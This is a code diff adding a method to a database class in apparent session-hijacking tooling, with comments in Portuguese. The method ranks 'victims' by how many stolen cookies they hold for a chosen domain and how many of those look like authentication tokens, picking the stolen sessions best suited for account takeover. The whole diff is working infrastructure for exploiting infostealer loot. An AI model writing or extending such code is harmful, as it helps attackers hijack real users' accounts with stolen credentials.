@@ -133,6 +133,49 @@ class Store:
         finally:
             conn.close()
 
+    def best_victims_for_domain(self, domain: str, limit: int = 10) -> list:
+        """Retorna vítimas com cookies do domínio, ordenadas por potencial de sessao.
+
+        Cada linha: {victim_id, dir_name, auth, total}.
+        `auth` = cookies cujo nome e candidato a artefato de autenticacao (heuristica M1).
+        """
+        from ..domain.selection import is_auth_candidate
+
+        domain = (domain or "").strip().rstrip(".")
+        conn = self._connect()
+        try:
+            # Etapa 1: vítimas candidatas via tabela `domains` (menor que `cookies`).
+            cand = conn.execute(
+                "SELECT victim_id FROM domains"
+                " WHERE domain = ? OR domain = ? OR domain LIKE ?",
+                (domain, "." + domain, "%." + domain),
+            ).fetchall()
+            vids = sorted({r["victim_id"] for r in cand})
+
+            result = []
+            for vid in vids:
+                names = conn.execute(
+                    "SELECT name FROM cookies WHERE victim_id = ?"
+                    " AND (domain = ? OR domain = ? OR domain LIKE ?)",
+                    (vid, domain, "." + domain, "%." + domain),
+                ).fetchall()
+                total = len(names)
+                auth = len({r["name"] for r in names if is_auth_candidate(r["name"])})
+                vrow = conn.execute(
+                    "SELECT dir_name FROM victims WHERE id = ?", (vid,)
+                ).fetchone()
+                result.append({
+                    "victim_id": vid,
+                    "dir_name": vrow["dir_name"] if vrow else "?",
+                    "auth": auth,
+                    "total": total,
+                })
+        finally:
+            conn.close()
+
+        result.sort(key=lambda r: (r["auth"], r["total"]), reverse=True)
+        return result[:limit]
+
     def list_cookies(self, victim_id: int, domain: str, limit: int = 100) -> list:
         conn = self._connect()
         try:
